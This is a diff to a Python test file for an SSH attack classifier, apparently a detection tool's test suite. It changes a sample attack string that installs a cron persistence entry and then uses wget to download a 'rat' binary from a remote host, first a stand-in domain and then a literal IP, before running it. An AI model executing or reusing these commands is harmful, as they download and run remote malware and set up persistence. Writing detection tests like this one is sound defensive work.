@@ -240,9 +240,10 @@ class TestSSHAttacks:
             "crontab -l | { cat; "
             "echo '*/5 * * * * /tmp/beacon'; "
             "} | crontab -; "
-            "wget http://c2.evil.com/rat -O /tmp/rat; "
+            "cd /tmp; "
+            "wget http://46.246.45.171/rat -O /tmp/rat; "
             "chmod +x /tmp/rat; "
-            "nohup /tmp/rat &",
+            "./rat &",
             is_http=False,
         )
         assert name in ("ADVANCED_APT", "Exploit", "Downloader"), \
